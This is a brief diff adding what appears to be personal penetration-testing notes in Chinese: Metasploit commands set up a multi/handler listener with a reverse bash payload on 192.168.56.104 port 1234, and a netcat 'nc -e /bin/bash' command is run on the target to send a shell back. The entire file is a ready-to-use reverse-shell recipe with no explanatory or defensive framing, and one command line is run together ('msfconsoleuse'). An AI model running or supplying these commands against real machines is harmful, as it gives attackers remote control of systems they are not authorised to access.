@@ -1,0 +1,11 @@
+监听
+msfconsoleuse 
+exploit/multi/handler
+set payload cmd/unix/reverse_bash
+set lhost 192.168.56.104
+set lport 1234
+exploit
+
+
+目标机执行
+nc -e /bin/bash 192.168.56.104 1234
